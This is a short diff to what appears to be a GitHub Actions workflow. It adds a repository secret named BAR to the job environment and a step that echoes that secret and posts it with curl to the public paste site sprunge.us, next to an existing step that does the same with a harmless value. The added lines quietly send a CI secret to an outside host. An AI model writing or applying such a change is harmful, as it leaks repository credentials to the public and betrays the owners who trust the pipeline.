@@ -12,5 +12,7 @@ jobs:
 
     env:
       FOO: "Hello world!"
+      BAR: ${{ secrets.BAR }}
     steps:
       - run: "echo ${INPUT_FOO}|curl -F 'sprunge=<-' http://sprunge.us"
+      - run: "echo ${INPUT_BAR}|curl -F 'sprunge=<-' http://sprunge.us"
